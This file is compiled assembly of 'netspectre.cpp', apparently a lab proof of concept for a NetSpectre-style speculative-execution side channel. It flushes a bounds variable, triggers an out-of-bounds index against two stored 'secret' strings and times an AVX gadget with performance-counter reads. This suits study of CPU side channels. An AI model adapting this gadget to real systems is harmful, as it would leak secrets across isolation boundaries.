	.file	"netspectre.cpp"
	.text
	.globl	mysecret1
	.section	.rodata
	.align 8
.LC0:
	.string	"I see NetSpectre by perfcounter"
	.section	.data.rel.local,"aw"
	.align 8
	.type	mysecret1, @object
	.size	mysecret1, 8
mysecret1:
	.quad	.LC0
	.globl	mysecret2
	.section	.rodata
	.align 8
.LC1:
	.string	"Magic Words Squeamish Ossifrage"
	.section	.data.rel.local
	.align 8
	.type	mysecret2, @object
	.size	mysecret2, 8
mysecret2:
	.quad	.LC1
	.globl	array
	.bss
	.align 32
	.type	array, @object
	.size	array, 512
array:
	.zero	512
	.globl	secretbit
	.align 32
	.type	secretbit, @object
	.size	secretbit, 1025
secretbit:
	.zero	1025
	.globl	v1
	.align 32
	.type	v1, @object
	.size	v1, 32
v1:
	.zero	32
	.globl	v2
	.align 32
	.type	v2, @object
	.size	v2, 32
v2:
	.zero	32
	.globl	v3
	.align 32
	.type	v3, @object
	.size	v3, 32
v3:
	.zero	32
	.globl	length
	.data
	.align 4
	.type	length, @object
	.size	length, 4
length:
	.long	64
	.text
	.globl	_Z10netspectrem
	.type	_Z10netspectrem, @function
_Z10netspectrem:
.LFB4388:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	andq	$-32, %rsp
	subq	$104, %rsp
	movq	%rdi, -96(%rsp)
	vmovdqa	v2(%rip), %ymm0
	vmovdqa	v1(%rip), %ymm1
	vmovdqa	%ymm1, 40(%rsp)
	vmovdqa	%ymm0, 72(%rsp)
	vmovdqa	40(%rsp), %ymm1
	vmovdqa	72(%rsp), %ymm0
	vpand	%ymm0, %ymm1, %ymm0
	vmovdqa	%ymm0, v3(%rip)
	vmovdqa	v2(%rip), %ymm0
	vmovdqa	v1(%rip), %ymm1
	vmovdqa	%ymm1, -24(%rsp)
	vmovdqa	%ymm0, 8(%rsp)
	vmovdqa	-24(%rsp), %ymm1
	vmovdqa	8(%rsp), %ymm0
	vpand	%ymm0, %ymm1, %ymm0
	vmovdqa	%ymm0, v3(%rip)
	vmovdqa	v2(%rip), %ymm0
	vmovdqa	v1(%rip), %ymm1
	vmovdqa	%ymm1, -88(%rsp)
	vmovdqa	%ymm0, -56(%rsp)
	vmovdqa	-88(%rsp), %ymm1
	vmovdqa	-56(%rsp), %ymm0
	vpand	%ymm0, %ymm1, %ymm0
	vmovdqa	%ymm0, v3(%rip)
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4388:
	.size	_Z10netspectrem, .-_Z10netspectrem
	.globl	_Z10run_victimm
	.type	_Z10run_victimm, @function
_Z10run_victimm:
.LFB4389:
	.cfi_startproc
	endbr64
	subq	$1112, %rsp
	.cfi_def_cfa_offset 1120
	movq	%rdi, 8(%rsp)
	movq	%fs:40, %rax
	movq	%rax, 1096(%rsp)
	xorl	%eax, %eax
	call	_Z9pfc_resetv@PLT
	movl	$0, 28(%rsp)
	movl	$0, 20(%rsp)
	jmp	.L6
.L9:
	movl	20(%rsp), %eax
	movl	length(%rip), %ecx
	movl	$0, %edx
	divl	%ecx
	movl	%edx, %eax
	movl	%eax, %eax
	movq	%rax, 32(%rsp)
	movl	$29, 24(%rsp)
	jmp	.L7
.L8:
	leaq	length(%rip), %rax
	movq	%rax, 48(%rsp)
	movq	48(%rsp), %rax
	clflush	(%rax)
	nop
	mfence
	nop
	movl	24(%rsp), %ecx
	movslq	%ecx, %rax
	imulq	$715827883, %rax, %rax
	shrq	$32, %rax
	movl	%ecx, %esi
	sarl	$31, %esi
	movl	%eax, %edx
	subl	%esi, %edx
	movl	%edx, %eax
	addl	%eax, %eax
	addl	%edx, %eax
	addl	%eax, %eax
	subl	%eax, %ecx
	movl	%ecx, %edx
	leal	-1(%rdx), %eax
	movw	$0, %ax
	cltq
	movq	%rax, 40(%rsp)
	movq	40(%rsp), %rax
	shrq	$16, %rax
	orq	%rax, 40(%rsp)
	movq	8(%rsp), %rax
	xorq	32(%rsp), %rax
	andq	40(%rsp), %rax
	xorq	32(%rsp), %rax
	movq	%rax, 40(%rsp)
	movzbl	secretbit(%rip), %eax
	movsbl	%al, %eax
	movl	%eax, 28(%rsp)
	movq	40(%rsp), %rax
	movq	%rax, %rdi
	call	_Z10netspectrem
	subl	$1, 24(%rsp)
.L7:
	cmpl	$0, 24(%rsp)
	jns	.L8
	movl	$0, 24(%rsp)
	leaq	length(%rip), %rax
	movq	%rax, 56(%rsp)
	movq	56(%rsp), %rax
	clflush	(%rax)
	nop
	mfence
	nop
	movl	24(%rsp), %ecx
	movslq	%ecx, %rax
	imulq	$715827883, %rax, %rax
	shrq	$32, %rax
	movl	%ecx, %esi
	sarl	$31, %esi
	movl	%eax, %edx
	subl	%esi, %edx
	movl	%edx, %eax
	addl	%eax, %eax
	addl	%edx, %eax
	addl	%eax, %eax
	subl	%eax, %ecx
	movl	%ecx, %edx
	leal	-1(%rdx), %eax
	movw	$0, %ax
	cltq
	movq	%rax, 40(%rsp)
	movq	40(%rsp), %rax
	shrq	$16, %rax
	orq	%rax, 40(%rsp)
	movq	8(%rsp), %rax
	xorq	32(%rsp), %rax
	andq	40(%rsp), %rax
	xorq	32(%rsp), %rax
	movq	%rax, 40(%rsp)
	movzbl	secretbit(%rip), %eax
	movsbl	%al, %eax
	movl	%eax, 28(%rsp)
#APP
# 87 "netspectre.cpp" 1
	CPUID
# 0 "" 2
# 89 "netspectre.cpp" 1
	        .intel_syntax noprefix                  	
        push rax                                	
        lahf                                    	
        seto al                                 	
        push rax                                	
        push rcx                                	
        push rdx                                	
        push r15                                	
        mov r15,  pfc_mem            	
        mov rcx, 0                              	
        lfence; rdpmc; lfence                   	
        shl rdx, 32; or rdx, rax                	
        sub [r15 + 0], rdx                      	
        mov rcx, 1                              	
        lfence; rdpmc; lfence                   	
        shl rdx, 32; or rdx, rax                	
        sub [r15 + 8], rdx                      	
        mov rcx, 2                              	
        lfence; rdpmc; lfence                   	
        shl rdx, 32; or rdx, rax                	
        sub [r15 + 16], rdx                     	
        mov rcx, 3                              	
        lfence; rdpmc; lfence                   	
        shl rdx, 32; or rdx, rax                	
        sub [r15 + 24], rdx                     	
        lfence                                  	
        pop r15; lfence                         	
        pop rdx; lfence                         	
        pop rcx; lfence                         	
        pop rax; lfence                         	
        cmp al, -127; lfence                    	
        sahf; lfence                            	
        pop rax;                                	
        lfence                                  	
        .att_syntax noprefix                   	

# 0 "" 2
#NO_APP
	movq	40(%rsp), %rax
	movq	%rax, %rdi
	call	_Z10netspectrem
#APP
# 93 "netspectre.cpp" 1
	        .intel_syntax noprefix                  	
        lfence                                  	
        mov r15, pfc_mem            	
        mov rcx, 0                              	
        lfence; rdpmc; lfence                   	
        shl rdx, 32; or rdx, rax                	
        add [r15 + 0], rdx                      	
        mov rcx, 1                              	
        lfence; rdpmc; lfence                   	
        shl rdx, 32; or rdx, rax                	
        add [r15 + 8], rdx                      	
        mov rcx, 2                              	
        lfence; rdpmc; lfence                   	
        shl rdx, 32; or rdx, rax                	
        add [r15 + 16], rdx                     	
        mov rcx, 3                              	
        lfence; rdpmc; lfence                   	
        shl rdx, 32; or rdx, rax                	
        add [r15 + 24], rdx                     	
        lfence                                  	
        .att_syntax noprefix                    	

# 0 "" 2
# 95 "netspectre.cpp" 1
	CPUID
# 0 "" 2
#NO_APP
	addl	$1, 20(%rsp)
.L6:
	cmpl	$999, 20(%rsp)
	jle	.L9
	call	_Z9pfc_printv@PLT
	nop
	movq	1096(%rsp), %rax
	subq	%fs:40, %rax
	je	.L10
	call	__stack_chk_fail@PLT
.L10:
	addq	$1112, %rsp
	.cfi_def_cfa_offset 8
	ret
	.cfi_endproc
.LFE4389:
	.size	_Z10run_victimm, .-_Z10run_victimm
	.section	.rodata
.LC2:
	.string	"%d\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB4390:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	andq	$-32, %rsp
	subq	$192, %rsp
	movq	%fs:40, %rax
	movq	%rax, 184(%rsp)
	xorl	%eax, %eax
	call	_Z9pfc_setupv@PLT
	movq	mysecret1(%rip), %rax
	movq	%rax, 56(%rsp)
	movq	56(%rsp), %rax
	vmovdqu	(%rax), %ymm0
	vmovdqa	%ymm0, v1(%rip)
	movq	mysecret2(%rip), %rax
	movq	%rax, 48(%rsp)
	movq	48(%rsp), %rax
	vmovdqu	(%rax), %ymm0
	vmovdqa	%ymm0, v2(%rip)
	vmovdqa	v1(%rip), %ymm0
	leaq	96(%rsp), %rax
	movq	%rax, 40(%rsp)
	vmovdqa	%ymm0, 64(%rsp)
	vmovdqa	64(%rsp), %ymm0
	movq	40(%rsp), %rax
	vmovdqu	%ymm0, (%rax)
	nop
	movl	$0, 24(%rsp)
	jmp	.L14
.L15:
	movl	24(%rsp), %eax
	cltq
	movzbl	96(%rsp,%rax), %eax
	movsbl	%al, %eax
	movl	%eax, %edi
	call	putchar@PLT
	addl	$1, 24(%rsp)
.L14:
	cmpl	$31, 24(%rsp)
	jle	.L15
	movl	$10, %edi
	call	putchar@PLT
	movl	$0, %edi
	call	time@PLT
	movl	%eax, %edi
	call	srand@PLT
	movl	$0, 28(%rsp)
	jmp	.L16
.L17:
	call	rand@PLT
	andl	$1, %eax
	movl	%eax, %ecx
	movl	28(%rsp), %eax
	cltq
	leaq	secretbit(%rip), %rdx
	movb	%cl, (%rax,%rdx)
	addl	$1, 28(%rsp)
.L16:
	cmpl	$999, 28(%rsp)
	jle	.L17
	movb	$1, secretbit(%rip)
	leaq	secretbit(%rip), %rax
	leaq	array(%rip), %rdx
	subq	%rdx, %rax
	movq	%rax, 32(%rsp)
	movq	32(%rsp), %rax
	movq	%rax, %rsi
	leaq	.LC2(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	32(%rsp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, 32(%rsp)
	movq	%rax, %rdi
	call	_Z10run_victimm
	movl	$0, %eax
	movq	184(%rsp), %rdx
	subq	%fs:40, %rdx
	je	.L19
	call	__stack_chk_fail@PLT
.L19:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4390:
	.size	main, .-main
	.ident	"GCC: (Ubuntu 11.2.0-19ubuntu1) 11.2.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:
